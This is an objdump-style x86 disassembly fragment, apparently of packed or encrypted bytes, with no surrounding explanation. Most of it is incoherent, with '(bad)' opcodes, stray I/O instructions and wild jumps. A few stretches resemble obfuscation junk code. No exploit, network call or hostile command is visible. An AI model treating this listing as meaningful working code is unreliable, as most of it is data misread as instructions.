  403989:	adc    bl,BYTE PTR [ecx+eiz*2-0x5c]
  40398d:	das    
  40398e:	das    
  40398f:	ret    0xec74
  403992:	in     eax,dx
  403993:	in     al,dx
  403994:	xchg   BYTE PTR [ecx+0x6464e712],ah
  40399a:	jmp    0x80aff7ff
  40399f:	loope  0x403959
  4039a1:	clc    
  4039a2:	jp     0x403a00
  4039a4:	fstp   DWORD PTR [ebp-0x23f6be42]
  4039aa:	and    DWORD PTR [esp+eax*8-0x62],0x64
  4039af:	cmp    ch,0xfd
  4039b2:	iret   
  4039b3:	pop    ebp
  4039b4:	outs   dx,DWORD PTR ds:[esi]
  4039b5:	xor    eax,0xe46c8f43
  4039ba:	push   edx
  4039bb:	sub    dh,dl
  4039bd:	repz push esi
  4039bf:	pop    ebx
  4039c0:	aas    
  4039c1:	push   gs
  4039c3:	xchg   esp,eax
  4039c4:	pop    es
  4039c5:	push   esi
  4039c6:	cmp    DWORD PTR [ecx-0x2d],ebx
  4039c9:	sbb    eax,0x4166460b
  4039ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039cf:	and    eax,0x6ed747e5
  4039d4:	xchg   ebp,eax
  4039d5:	mov    cl,0x1d
  4039d7:	stos   BYTE PTR es:[edi],al
  4039d8:	je     0x403a59
  4039da:	or     BYTE PTR [esi+ebp*1+0x74927104],cl
  4039e1:	mov    ecx,0xf68a9bcd
  4039e6:	arpl   dx,ax
  4039e8:	and    DWORD PTR [edi],0xb12bdcfd
  4039ee:	ins    DWORD PTR es:[edi],dx
  4039ef:	int    0x9
  4039f1:	adc    bh,BYTE PTR [ecx-0x50]
  4039f4:	mov    ecx,0xbc3f59dc
  4039f9:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4039fb:	jl     0x403a56
  4039fd:	ret    
  4039fe:	cld    
  4039ff:	or     bl,BYTE PTR [esi+0xe2f3691]
  403a05:	add    al,0x8f
  403a07:	shld   DWORD PTR [ebx-0x66],ecx,cl
  403a0b:	cwde   
  403a0c:	lahf   
  403a0d:	jmp    0x9c83:0xa0d75712
  403a14:	shr    ebx,1
  403a16:	shl    DWORD PTR ds:0x45f6e5b4,1
  403a1c:	imul   ebx,DWORD PTR [ecx],0xffffffb6
  403a1f:	outs   dx,DWORD PTR ds:[esi]
  403a20:	repz mov edx,es
  403a23:	jge    0x403a99
  403a25:	jg     0x403a21
  403a27:	cmc    
  403a28:	xchg   BYTE PTR [edi+edx*4],bl
  403a2b:	comiss xmm4,DWORD PTR [ebp-0x1f]
  403a2f:	mov    edx,ebx
  403a31:	mov    ebx,0x8b3475c0
  403a36:	scas   al,BYTE PTR es:[edi]
  403a37:	sub    ebp,DWORD PTR [edx+0xa]
  403a3a:	rol    DWORD PTR [esi+0x40],0xba
  403a3e:	pop    ebp
  403a3f:	(bad)  
  403a40:	iret   
  403a41:	enter  0xf848,0x0
  403a45:	loope  0x403a54
  403a47:	(bad)  
  403a48:	dec    ecx
  403a49:	inc    edi
  403a4a:	ins    BYTE PTR es:[edi],dx
  403a4b:	mov    cl,0xba
  403a4d:	inc    ebp
  403a4e:	mov    bh,BYTE PTR [edi+0x3ec701d2]
  403a54:	stos   DWORD PTR es:[edi],eax
  403a55:	(bad)  
  403a57:	push   ss
  403a58:	das    
  403a59:	push   ds
  403a5a:	into   
  403a5b:	and    DWORD PTR [ecx],ebx
  403a5d:	xchg   ebp,eax
  403a5e:	mov    ecx,0x1b88f19b
  403a63:	jmp    0xaf00:0xdd237b42
  403a6a:	test   BYTE PTR es:[edi+edx*4+0x1a368f4e],0xbc
  403a73:	rcl    cl,0x79
  403a76:	dec    edi
  403a77:	data16 into 
  403a79:	sbb    al,0x69
  403a7b:	mov    DWORD PTR [ebp-0x7affe295],edx
  403a81:	dec    ebp
  403a82:	sub    eax,0x6d16cc13
  403a87:	gs adc al,0x1f
  403a8a:	push   ds
  403a8b:	pop    es
  403a8c:	xor    eax,0xfaeeee38
  403a91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a92:	mov    al,0xf1
  403a94:	xchg   esi,eax
  403a95:	pop    ss
  403a96:	adc    eax,0x47a08bb9
  403a9b:	test   BYTE PTR [ebx-0x2c],dh
  403a9e:	in     eax,0x68
  403aa0:	adc    ebp,0x7e
  403aa3:	pop    ebp
  403aa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403aa5:	cli    
  403aa6:	pop    eax
  403aa7:	mov    ah,BYTE PTR [eax-0x2d]
  403aaa:	push   esp
  403aab:	or     ebx,DWORD PTR [ebx*8+0x39ee51f0]
  403ab2:	shl    DWORD PTR [edi+0x50205761],1
  403ab8:	bound  eax,QWORD PTR [ebx-0x3f]
  403abb:	imul   ecx,DWORD PTR [eax+0x33],0x46
  403abf:	push   edx
  403ac0:	cmc    
  403ac1:	xchg   esi,eax
  403ac2:	or     eax,0xf9f893cc
  403ac7:	dec    edi
  403ac8:	shl    al,1
  403aca:	xchg   ebx,eax
  403acb:	jecxz  0x403b49
  403acd:	ds aam 0xdf
  403ad0:	or     BYTE PTR [ebx],bl
  403ad2:	shr    edi,1
  403ad4:	test   ebx,0xec292da1
  403ada:	or     al,0x5d
  403adc:	xor    ah,BYTE PTR [edx-0x70bef8d9]
  403ae2:	mov    edx,0xaa83efe4
  403ae7:	(bad)  
  403ae8:	addr16 jmp 0x403b24
  403aeb:	pop    edi
  403aec:	xor    ebx,DWORD PTR [ebp+0x458ab8c8]
  403af2:	dec    DWORD PTR [edi]
  403af4:	mov    bh,0xd
  403af6:	jmp    0x403ade
  403af8:	inc    edx
  403af9:	add    BYTE PTR [ecx],dl
  403afb:	or     eax,0x42fd76
  403b00:	mov    ecx,DWORD PTR [ebp-0x10]
  403b03:	sub    DWORD PTR ds:0x42e124,0x77ef
  403b0d:	xor    al,0x47
  403b0f:	sub    al,0x37
  403b11:	and    DWORD PTR ds:0x42fcfd,0x33b1
  403b1b:	mov    BYTE PTR [ecx],al
  403b1d:	neg    DWORD PTR ds:0x42fcf5
  403b23:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403b2a:	jmp    0x403e8a
  403b2f:	fist   WORD PTR [esi+0x1]
  403b32:	cdq    
  403b33:	mov    cl,0x69
  403b35:	addr16 push edx
  403b37:	push   esi
  403b38:	and    DWORD PTR [ecx+0x3ea16997],esi
  403b3e:	aad    0xc5
  403b40:	push   ds
  403b41:	jo     0x403bb3
  403b43:	cmp    eax,0xf270707d
  403b48:	(bad)  
  403b49:	jg     0x403b0c
  403b4b:	mov    dl,bh
  403b4d:	mul    BYTE PTR [esi]
  403b4f:	outs   dx,BYTE PTR ds:[esi]
  403b50:	out    dx,eax
  403b51:	add    ecx,DWORD PTR [eax]
  403b53:	sbb    esi,DWORD PTR [eax-0x136fc3e]
  403b59:	cli    
  403b5a:	popf   
  403b5b:	push   ecx
  403b5c:	dec    ebx
  403b5d:	xor    dh,BYTE PTR [ebp+0x3d]
  403b60:	jecxz  0x403b59
  403b62:	mov    bh,0x1a
  403b64:	das    
  403b65:	push   eax
  403b66:	push   ebx
  403b67:	imul   ebp,DWORD PTR [eax+edi*1-0x15689f31],0x64
  403b6f:	sub    BYTE PTR [esi+0x68],0x62
  403b73:	mov    DWORD PTR [ebx-0x15b4f636],esi
  403b79:	inc    ebx
  403b7a:	and    DWORD PTR [ecx-0x36742a64],ebx
  403b80:	mov    eax,0xc0f9c148
  403b85:	cmp    esi,DWORD PTR [ebp+ebp*2-0x4dad8171]
  403b8c:	sbb    edx,ecx
  403b8e:	gs (bad) 
  403b90:	cs sti 
  403b92:	xor    BYTE PTR [ebx+0x27],bh
  403b95:	cs xor ebp,ecx
  403b98:	data16 std 
  403b9a:	ret    0x2429
  403b9d:	cdq    
  403b9e:	xlat   BYTE PTR ds:[ebx]
  403b9f:	add    BYTE PTR [eax-0x2620033b],ch
  403ba5:	ret    0x1954
  403ba8:	popa   
  403ba9:	push   esi
  403baa:	leave  
  403bab:	test   DWORD PTR [eax-0x5d2a1bbb],ebx
  403bb1:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  403bb3:	add    cl,BYTE PTR [edi]
  403bb5:	sti    
  403bb6:	test   ch,0xd1
  403bb9:	inc    esp
  403bba:	je     0x403b79
  403bbc:	shl    DWORD PTR [ecx+esi*2-0x6d767b7],1
  403bc3:	ds push edx
  403bc5:	stc    
  403bc6:	jbe    0x403c30
  403bc8:	mov    ebp,0xb69ce3e3
  403bcd:	add    DWORD PTR [edx],edx
  403bcf:	aaa    
  403bd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bd1:	popa   
  403bd2:	aas    
  403bd3:	sti    
  403bd4:	js     0x403c23
  403bd6:	(bad)  
  403bd8:	cdq    
  403bd9:	mov    esi,0xff9eb107
  403bde:	das    
  403bdf:	(bad)  
  403be0:	aad    0x2b
  403be2:	pushf  
  403be3:	push   0xde1ca1af
  403be8:	lea    esi,[ebp-0x608fa0c3]
  403bee:	mov    ds:0x598cf87a,eax
  403bf3:	pushf  
  403bf4:	add    cl,dh
  403bf6:	sub    BYTE PTR [ebp+0x42],0xb2
  403bfa:	(bad)  
  403bfb:	aad    0x11
  403bfd:	frstpm(287 only) 
  403bff:	ret    
  403c00:	out    dx,eax
  403c01:	cli    
  403c02:	out    dx,al
  403c03:	mov    cl,dl
  403c05:	jmp    0xd51b9700
  403c0a:	inc    eax
  403c0b:	adc    eax,0x5aa6de7d
  403c10:	repnz cmp eax,0x6a48714c
  403c16:	xor    esp,esi
  403c18:	rcl    BYTE PTR [ecx+edx*1],0x95
  403c1c:	adc    dh,BYTE PTR [ebx]
  403c1e:	stos   BYTE PTR es:[edi],al
  403c1f:	mov    ds:0xe81cbb95,eax
  403c24:	xchg   edx,eax
  403c25:	xchg   edx,eax
  403c26:	push   0xa74ffc3a
  403c2b:	inc    edi
  403c2c:	xchg   edi,eax
  403c2d:	xrelease xchg BYTE PTR [ebp+0x7f],dl
  403c31:	or     al,0x79
  403c33:	pop    es
  403c34:	push   0xcbc8bfcf
  403c39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c3a:	jle    0x403c5d
  403c3c:	lahf   
  403c3d:	repz icebp 
  403c3f:	sti    
  403c40:	adc    al,0xca
  403c42:	fsub   QWORD PTR [edi*4-0x5f231cfc]
  403c49:	pop    eax
  403c4a:	loopne 0x403bf4
  403c4c:	sahf   
  403c4d:	jb     0x403bf2
  403c4f:	in     eax,0x1b
  403c51:	adc    DWORD PTR [esi],esi
  403c53:	adc    edi,DWORD PTR [ebp-0x1f]
  403c56:	jae    0x403c05
  403c58:	inc    ebx
  403c59:	out    0x90,eax
  403c5b:	sahf   
  403c5c:	aam    0xd7
  403c5e:	inc    ecx
  403c5f:	cld    
  403c60:	adc    al,0xe5
  403c62:	pop    esi
  403c63:	xor    DWORD PTR [eax+0x4dbf085e],esi
  403c69:	xor    eax,DWORD PTR [eax+0x59]
  403c6c:	fcom   QWORD PTR fs:[ebp+0x42]
  403c70:	or     eax,0x722b1ebc
  403c75:	je     0x403c50
  403c77:	push   ds
  403c78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c79:	jne    0x403ccf
  403c7b:	out    dx,al
  403c7c:	lds    ecx,FWORD PTR [eax+0x5b97512]
  403c82:	push   es
  403c83:	and    edi,edx
  403c85:	adc    ecx,DWORD PTR [eax+ebx*4+0x7d355d9d]
  403c8c:	pop    esi
  403c8d:	inc    edx
  403c8e:	daa    
  403c8f:	jl     0x403c1a
  403c91:	pop    esp
  403c92:	loopne 0x403cde
  403c94:	xchg   esp,eax
  403c95:	pop    es
  403c96:	retf   0x2c75
  403c99:	inc    ecx
  403c9a:	pop    ebp
  403c9b:	mov    dl,0xb9
  403c9d:	sbb    esi,DWORD PTR [ebx+eax*4-0x76bd96ba]
  403ca4:	fdiv   st(2),st
  403ca6:	dec    edi
  403ca7:	mov    DWORD PTR [esi],ecx
  403ca9:	push   ds
  403caa:	punpcklwd mm6,mm2
  403cad:	stos   DWORD PTR es:[edi],eax
  403cae:	std    
  403caf:	sbb    al,0xa0
  403cb1:	fistp  QWORD PTR [esi+eiz*2-0x17]
  403cb5:	and    eax,0xcf75a694
  403cba:	or     dh,BYTE PTR [ecx-0x16f6c798]
  403cc0:	fidivr DWORD PTR [edx]
  403cc2:	gs mov ebp,0xfe5f6b36
  403cc8:	in     eax,dx
  403cc9:	mov    cl,0xff
  403ccb:	sbb    BYTE PTR ds:0x10c2be71,0x99
  403cd2:	cmc    
  403cd3:	mov    ebp,0xb0dfb536
  403cd8:	sub    eax,0x697214e
  403cdd:	mov    dh,BYTE PTR [edx+0x15]
  403ce0:	jmp    0x403d18
  403ce2:	pop    es
  403ce3:	popf   
  403ce4:	fstp   TBYTE PTR [eax-0x64]
  403ce7:	sti    
  403ce8:	cmp    al,bl
  403cea:	sbb    edi,DWORD PTR [ebp-0x5838f396]
  403cf0:	pop    esi
  403cf1:	pop    edx
  403cf2:	push   es
  403cf3:	xor    edx,DWORD PTR [edx+edi*4-0x6d]
  403cf7:	add    al,0xc9
  403cf9:	push   ebp
  403cfa:	add    DWORD PTR [ebx],ecx
  403cfc:	push   ebx
  403cfd:	xchg   ebp,eax
  403cfe:	arpl   WORD PTR [esi-0x5c],ax
  403d01:	das    
  403d02:	jecxz  0x403cda
  403d04:	pushf  
  403d05:	hlt    
  403d06:	mov    dh,0x4c
  403d08:	dec    ebx
  403d09:	fdiv   DWORD PTR [ebx-0x54]
  403d0c:	lods   al,BYTE PTR ds:[esi]
  403d0d:	shr    DWORD PTR [edi+esi*4-0x37f6ccdc],1
  403d14:	xor    BYTE PTR [ecx+0x76],0xc2
  403d18:	(bad)  
  403d19:	jo     0x403d5e
  403d1b:	mov    ds:0x5a306bb2,eax
  403d20:	call   0x7cfb:0xd08aefe8
  403d27:	mov    ah,0x37
  403d29:	fst    QWORD PTR [ecx-0x18]
  403d2c:	test   eax,0x90ca935a
  403d31:	inc    eax
  403d32:	mov    al,BYTE PTR [esi]
  403d34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d35:	(bad)  [ebp-0x17]
  403d38:	mov    bl,0x51
  403d3a:	aas    
  403d3b:	lods   eax,DWORD PTR gs:[esi]
  403d3d:	int    0x51
  403d3f:	adc    esp,DWORD PTR [edx*2-0x38b8f7cf]
  403d46:	es jns 0x403cdb
  403d49:	pusha  
  403d4a:	jmp    0xfcea6284
  403d4f:	mov    ebp,0xf9a2140f
  403d54:	inc    ebp
  403d55:	gs sub ebx,eax
  403d58:	hlt    
  403d59:	mov    ch,0xbf
  403d5b:	mov    ah,0x20
  403d5d:	mov    ch,0xed
  403d5f:	lds    edi,FWORD PTR [esi-0x2c72952f]
  403d65:	cs dec edx
  403d67:	xor    DWORD PTR [esp+eiz*2],edi
  403d6a:	fsub   DWORD PTR [eax+0xed2c90c]
  403d70:	mov    cs,WORD PTR [edx-0xcf17368]
  403d76:	lea    esp,[edi+esi*1-0x34]
  403d7a:	ss or  ch,ch
  403d7d:	fldcw  WORD PTR [edx]
  403d7f:	repz xlat BYTE PTR ds:[ebx]
  403d81:	pop    ds
  403d82:	and    al,0xbe
  403d84:	inc    ebp
  403d85:	adc    DWORD PTR [eax],edx
  403d87:	retf   
  403d88:	lock and DWORD PTR [eax+0x1722cf27],ebp
  403d8f:	in     al,0x81
  403d91:	dec    edi
  403d92:	mov    dl,BYTE PTR [edx+0x447fb6c4]
  403d98:	add    ecx,ecx
  403d9a:	cmp    dl,BYTE PTR [eax]
  403d9c:	loop   0x403db4
  403d9e:	retf   0x71c
  403da1:	cmp    ecx,DWORD PTR [edi]
  403da3:	mov    edx,0xe65735ee
  403da8:	add    al,0x3d
  403daa:	outs   dx,DWORD PTR ds:[esi]
  403dab:	fs cli 
  403dad:	inc    edi
  403dae:	xchg   esp,eax
  403daf:	ds ins BYTE PTR es:[edi],dx
  403db1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403db2:	sbb    eax,0xef8a9900
  403db7:	mov    esp,0xd4aaede6
  403dbc:	and    BYTE PTR [esi-0x20772b71],al
  403dc2:	call   0x50a64f02
  403dc7:	outs   dx,DWORD PTR ds:[esi]
  403dc8:	test   DWORD PTR [ebx-0x2263f925],esp
  403dce:	pop    ecx
  403dcf:	sub    dl,al
  403dd1:	(bad)  
  403dd2:	pop    esp
  403dd3:	xlat   BYTE PTR ds:[ebx]
  403dd4:	daa    
  403dd5:	pop    ecx
  403dd6:	fidivr WORD PTR ds:[eax-0x4720ed3e]
  403ddd:	pop    eax
  403dde:	sbb    BYTE PTR [edi+eiz*1+0x76c4ba43],dh
  403de5:	or     DWORD PTR [edi-0x50],ebp
  403de8:	js     0x403e07
  403dea:	xchg   edx,eax
  403deb:	sbb    eax,0x3cccf432
  403df0:	pop    DWORD PTR [eax]
  403df2:	imul   edi,DWORD PTR [eax+esi*2+0x9],0xffffffb4
  403df7:	pop    edi
  403df8:	inc    eax
  403df9:	pop    esi
  403dfa:	xchg   edx,eax
  403dfb:	test   DWORD PTR [edi-0x3ef53963],0xbfc8b2de
  403e05:	add    dl,al
  403e07:	pop    ds
  403e08:	mov    ch,0xc4
  403e0a:	(bad)  
  403e0b:	inc    edi
  403e0c:	aam    0xa9
  403e0e:	fmul   st,st(7)
  403e10:	mov    edx,DWORD PTR [esi+0x2b6048bd]
  403e16:	in     eax,dx
  403e17:	popf   
  403e18:	or     al,0x9c
  403e1a:	fnstenv [eax+ebp*2-0x15]
  403e1e:	add    al,0x33
  403e20:	pop    edi
  403e21:	add    ebx,eax
  403e23:	repz adc edx,DWORD PTR [esi-0x5a064abb]
  403e2a:	shr    DWORD PTR [eax-0xa5bc25c],0xb9
  403e31:	fcomp  QWORD PTR [edx]
  403e33:	adc    ebp,DWORD PTR gs:[edi-0x7c]
  403e37:	jg     0x403e7d
  403e39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e3a:	sub    ah,BYTE PTR [ebp+0x51c86b20]
  403e40:	xlat   BYTE PTR ds:[ebx]
  403e41:	dec    eax
  403e42:	sti    
  403e43:	cmp    ch,ah
  403e45:	fldcw  WORD PTR [edi+eax*2]
  403e48:	jne    0x403ec4
  403e4a:	adc    al,cl
  403e4c:	out    0x17,al
  403e4e:	mov    eax,ds:0xbf6ce229
  403e53:	lods   al,BYTE PTR ds:[esi]
  403e54:	hlt    
  403e55:	mov    al,0xcc
  403e57:	jecxz  0x403e45
  403e59:	adc    al,0x94
  403e5b:	mov    ds:0xd0603c77,al
  403e60:	mov    esi,0x68c74563
  403e65:	(bad)  
  403e66:	data16 jg 0x403e36
  403e69:	in     al,dx
  403e6a:	or     edx,DWORD PTR [edi]
  403e6c:	push   ebp
  403e6d:	pop    ebx
  403e6e:	jno    0x403e9f
  403e70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e71:	mov    al,0x60
  403e73:	arpl   WORD PTR [esi-0x40c5cb64],bx
  403e79:	loop   0x403ed7
  403e7b:	imul   esi,ebp,0x74b42f7b
  403e81:	lock fimul WORD PTR ds:[ebx-0x26e09b6c]
  403e89:	xor    al,bh
  403e8b:	inc    ebp
  403e8c:	lock xor BYTE PTR [ebp+0x458bf89c],al
  403e93:	clc    
  403e94:	mov    ecx,0x7510855
  403e99:	push   esi
  403e9a:	xor    eax,ecx
  403e9c:	mov    esi,DWORD PTR ds:0x42e11c
  403ea2:	adc    DWORD PTR ds:0x42e70f,esi
  403ea8:	mov    esi,0x32729c
  403ead:	add    eax,esi
  403eaf:	mov    DWORD PTR ds:0x42fd72,0x1a92
  403eb9:	jmp    0x40423a
  403ebe:	mov    dl,BYTE PTR [ebp-0x1]
  403ec1:	mov    DWORD PTR ds:0x42fd05,0x5bb3
  403ecb:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403ecf:	mov    DWORD PTR ds:0x42e6ef,0x7752
  403ed9:	jmp    0x404239
  403ede:	jge    0x403ed6
  403ee0:	retf   0xf1c4
  403ee3:	in     al,0x15
  403ee5:	icebp  
  403ee6:	ss mov esp,0xc3601c35
  403eec:	and    eax,0x701b820c
  403ef1:	jo     0x403f30
  403ef3:	jge    0x403f65
  403ef5:	jo     0x403f6f
  403ef7:	xor    esi,DWORD PTR [esi]
  403ef9:	xor    BYTE PTR [ebx+ebx*2-0x9],0x28
  403efe:	mov    bl,0x6c
  403f00:	inc    edi
  403f01:	or     dh,al
  403f03:	mov    edi,0x582a3983
  403f08:	lods   eax,DWORD PTR ds:[esi]
  403f09:	arpl   WORD PTR [ebx],sp
  403f0b:	pop    ebx
  403f0c:	not    BYTE PTR [edi]
  403f0e:	and    BYTE PTR ds:0xe54a76e9,dl
  403f14:	push   esi
  403f15:	add    DWORD PTR [ebp-0x5011f076],edx
  403f1b:	loop   0x403f28
  403f1d:	xchg   esi,eax
  403f1e:	sbb    dh,BYTE PTR [edx-0x59]
  403f21:	dec    ebx
  403f22:	fild   QWORD PTR [edi+0x40]
  403f25:	and    BYTE PTR [ecx-0x61eb2aca],bl
  403f2b:	aaa    
  403f2c:	fdiv   st,st(4)
  403f2e:	nop
  403f2f:	es mov edx,0xd6544ae6
  403f35:	(bad)
  403f38:	mov    WORD PTR [edi+0x23],ds
  403f3b:	xchg   esi,eax
  403f3c:	jo     0x403fb9
  403f3e:	clc    
  403f3f:	mov    WORD PTR [edi-0x7b],cs
  403f42:	dec    eax
  403f43:	xchg   edi,eax
  403f44:	mov    ch,0x74
  403f46:	sub    eax,0x4c674111
  403f4b:	addr16 pop esp
  403f4d:	out    dx,al
  403f4e:	retf   
  403f4f:	pop    ss
  403f50:	mov    ah,0x15
  403f52:	adc    ebx,DWORD PTR [ecx]
  403f54:	(bad)  [eax-0x3a]
  403f57:	stc    
  403f58:	in     eax,0x15
  403f5a:	cmp    eax,0x184fa42d
  403f5f:	nop
  403f60:	nop
  403f61:	int    0x65
  403f63:	mov    cl,0x5c
  403f65:	lds    ebx,FWORD PTR [esi]
  403f67:	popf   
  403f68:	sub    eax,0x958c4fbf
  403f6d:	pop    edx
  403f6e:	adc    edx,DWORD PTR [ebp-0x7e]
  403f71:	test   DWORD PTR [edx],eax
  403f73:	imul   ebp,DWORD PTR [esi+ecx*2],0xc
  403f77:	mov    ah,0x80
  403f79:	push   ds
  403f7a:	sbb    DWORD PTR [ebx+ecx*1-0x6d4d0c4d],ebx
  403f81:	data16 mov ah,0x60
  403f84:	test   DWORD PTR [edi-0x59],eax
  403f87:	cmp    ch,ch
  403f89:	in     eax,0x12
  403f8b:	neg    DWORD PTR [esi+0x15]
  403f8e:	rol    bh,cl
  403f90:	inc    edx
  403f91:	cwde   
  403f92:	xor    al,0x57
  403f94:	push   ss
  403f95:	je     0x403f31
  403f97:	lea    ebx,[ecx+0x72]
  403f9a:	xchg   esi,eax
  403f9b:	div    BYTE PTR ds:0x1856b51f
  403fa1:	xor    BYTE PTR [ebp-0x9],dl
  403fa4:	xor    DWORD PTR [esp+eax*2+0x48],0xffffff8f
  403fa9:	pop    esp
  403faa:	outs   dx,DWORD PTR ds:[esi]
  403fab:	add    bh,0x60
  403fae:	xchg   DWORD PTR [edx-0x4fc1c7b4],ecx
  403fb4:	fwait
  403fb5:	cld    
  403fb6:	loope  0x403fed
  403fb8:	xchg   edx,eax
  403fb9:	jns    0x403f65
  403fbb:	mov    eax,ds:0xae7c71eb
  403fc0:	jae    0x404035
  403fc2:	mov    dh,0x70
  403fc4:	xor    ch,BYTE PTR [edi]
  403fc6:	xchg   DWORD PTR [esi-0xd],ecx
  403fc9:	lea    esi,[ebx]
  403fcb:	lods   al,BYTE PTR ds:[esi]
  403fcc:	(bad)  
  403fcd:	push   ds
  403fce:	leave  
  403fcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fd0:	mov    edx,0x26ecfddc
  403fd5:	xor    dl,dh
  403fd7:	sbb    DWORD PTR [edi],edi
  403fd9:	push   ebp
  403fda:	push   edx
  403fdb:	xchg   edx,eax
  403fdc:	mov    dh,0x15
  403fde:	ins    DWORD PTR es:[edi],dx
  403fdf:	inc    ecx
  403fe0:	sub    al,cl
  403fe2:	mov    ah,0xbb
  403fe4:	xor    bl,0xe
  403fe7:	inc    ebp
  403fe8:	pop    es
  403fe9:	adc    dh,BYTE PTR [ebp-0x5e361136]
  403fef:	imul   esi,DWORD PTR [esi-0x240f7906],0x83aff09a
  403ff9:	ja     0x403fe9
  403ffb:	xor    al,0x30
  403ffd:	xor    eax,0xcfbc854b
  404002:	dec    ecx
  404003:	dec    edi
  404004:	mov    bh,0x36
  404006:	sbb    eax,0xcc4d50ad
  40400b:	popa   
  40400c:	xchg   esp,eax
  40400d:	imul   edx,DWORD PTR [ebp+ebp*8+0x1e152dc9],0x53
  404015:	mov    ah,0x9a
  404017:	xchg   edi,eax
  404018:	mov    ebx,edi
  40401a:	xchg   esp,ecx
  40401c:	xchg   edx,eax
  40401d:	add    BYTE PTR [eax-0x56],dl
  404020:	scas   al,BYTE PTR es:[edi]
  404021:	sar    DWORD PTR ss:[esi+0x37],1
  404025:	pusha  
  404026:	pop    ss
  404027:	ds repz and al,0x31
  40402b:	and    ah,BYTE PTR [ebp-0x524bbae7]
  404031:	cld    
  404032:	scas   al,BYTE PTR es:[edi]
  404033:	adc    al,0xd2
  404035:	adc    cl,BYTE PTR [eax-0x40b2e50a]
  40403b:	mov    ch,0x67
  40403d:	aas    
  40403e:	imul   esp,edx,0xb903956f
  404044:	rcl    DWORD PTR [edi-0x41fd89d3],cl
  40404a:	fisubr DWORD PTR [ecx+0xa]
  40404d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40404e:	xor    DWORD PTR [ebp+0x7c],ebp
  404051:	hlt    
  404052:	(bad)  
  404053:	pop    esp
  404054:	int    0xe2
  404056:	jl     0x404028
  404058:	add    edx,ecx
  40405a:	lods   eax,DWORD PTR ds:[esi]
  40405b:	cwde   
  40405c:	xchg   DWORD PTR [esi-0x6e],eax
  40405f:	mov    ds:0x3dcaecf,al
  404064:	inc    ebx
  404065:	es mov esi,0x938c6409
  40406b:	inc    ecx
  40406c:	aaa    
  40406d:	add    esp,0xa3aa49c5
  404073:	cmc    
  404074:	pop    esp
  404075:	ja     0x4040e3
  404077:	loop   0x404054
  404079:	add    eax,0x9fb78b08
  40407e:	retf   0xb5c8
  404081:	mov    bh,0x35
  404084:	dec    esp
  404085:	outs   dx,DWORD PTR ds:[esi]
  404086:	imul   DWORD PTR [eax-0x21]
  404089:	inc    ebx
  40408a:	cmc    
  40408b:	and    bh,dl
  40408d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40408e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40408f:	aaa    
  404090:	pop    ecx
  404091:	cmp    eax,DWORD PTR [ebx-0x40]
  404094:	inc    esp
  404095:	in     al,dx
  404096:	sub    BYTE PTR ds:[edx+ecx*2+0x7256f68],al
  40409e:	fsub   DWORD PTR ss:[ecx]
  4040a1:	push   esi
  4040a2:	je     0x4040cc
  4040a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040a5:	es lock in eax,0xaa
  4040a9:	out    0xe0,al
  4040ab:	push   ebx
  4040ac:	aaa    
  4040ad:	inc    ecx
  4040ae:	int    0x6c
  4040b0:	pop    es
  4040b1:	shl    BYTE PTR [eax+0x26f06540],cl
  4040b7:	aas    
  4040b8:	fcmove st,st(0)
  4040ba:	retf   
  4040bb:	dec    esp
  4040bc:	in     eax,0x72
  4040be:	lds    ecx,FWORD PTR [edx+ecx*8-0x69]
  4040c2:	mov    ebp,0x7109ec71
  4040c7:	std    
  4040c8:	iret   
  4040c9:	cmc    
  4040ca:	mov    edi,0x7fb024df
  4040cf:	mov    ah,0x54
  4040d1:	nop
  4040d2:	dec    edx
  4040d3:	jne    0x404091
  4040d5:	ja     0x404070
  4040d7:	dec    ebp
  4040d8:	jae    0x404092
  4040da:	push   esi
  4040db:	js     0x404073
  4040dd:	outs   dx,DWORD PTR ds:[esi]
  4040de:	out    dx,eax
  4040df:	pop    edi
  4040e0:	jge    0x40415e
  4040e2:	cwde   
  4040e3:	xchg   al,ch
  4040e5:	push   ebx
  4040e6:	jb     0x4040e6
  4040e8:	scas   al,BYTE PTR es:[edi]
  4040e9:	sbb    eax,0x79c6140b
  4040ee:	sbb    bh,BYTE PTR [edx+0x746c3fe7]
  4040f4:	aad    0xf2
  4040f6:	jno    0x40412a
  4040f8:	lods   al,BYTE PTR ds:[esi]
  4040f9:	cmp    eax,0xbf5831ff
  4040fe:	dec    esi
  4040ff:	pusha  
  404100:	xchg   ecx,eax
  404101:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404102:	retf   
  404103:	xor    cl,al
  404105:	adc    esp,DWORD PTR [ecx+ecx*8]
  404108:	mov    BYTE PTR [edx-0x68],al
  40410b:	and    al,BYTE PTR [edi]
  40410d:	adc    eax,0xe7c3e38
  404112:	jno    0x40412f
  404114:	jno    0x404146
  404116:	ret    
  404117:	mov    edx,0x486570f1
  40411c:	in     al,0x39
  40411e:	int    0x64
  404120:	das    
  404121:	idiv   DWORD PTR [ebx+0x1a]
  404124:	cwde   
  404125:	xor    al,0xb8
  404127:	out    dx,al
  404128:	or     dh,BYTE PTR [eax-0x4c5cf3be]
  40412e:	mov    esi,0x95b1c453
  404133:	test   al,0xf3
  404135:	sahf   
  404136:	popa   
  404137:	jne    0x4040fa
  404139:	sbb    ch,BYTE PTR [esi-0x3af72dc7]
  40413f:	mov    BYTE PTR [ecx+eax*1-0x3835e0ec],al
  404146:	daa    
  404147:	xchg   ah,bl
  404149:	jg     0x404138
  40414b:	push   esp
